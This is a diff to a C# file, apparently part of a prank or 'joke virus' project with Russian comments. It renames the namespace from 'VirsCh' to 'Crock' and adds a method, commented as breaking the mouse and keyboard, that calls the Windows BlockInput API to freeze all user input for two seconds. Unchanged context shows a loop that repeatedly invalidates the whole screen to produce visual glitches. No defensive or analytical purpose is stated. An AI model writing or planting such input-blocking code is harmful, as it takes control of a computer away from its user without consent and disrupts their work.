@@ -2,11 +2,13 @@
 using System.Runtime.InteropServices;
 using System.Threading;
 
-namespace VirsCh
+namespace Crock
 {
     class Misc
     {
         // Регистрация DLL
+        [DllImport("user32.dll")]
+        private static extern bool BlockInput(bool block);
         [DllImport("user32.dll")]
         static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);
 
@@ -24,6 +26,15 @@ namespace VirsCh
                 InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
                 Thread.Sleep(10);
             }
+        }
+
+        // Ломание роботы мышки и клавиатуры
+        public static void InputFuck()
+        {
+            BlockInput(true);
+            Thread.Sleep(2000);
+            BlockInput(false);
+            Thread.Sleep(2000);
         }
     }
 }
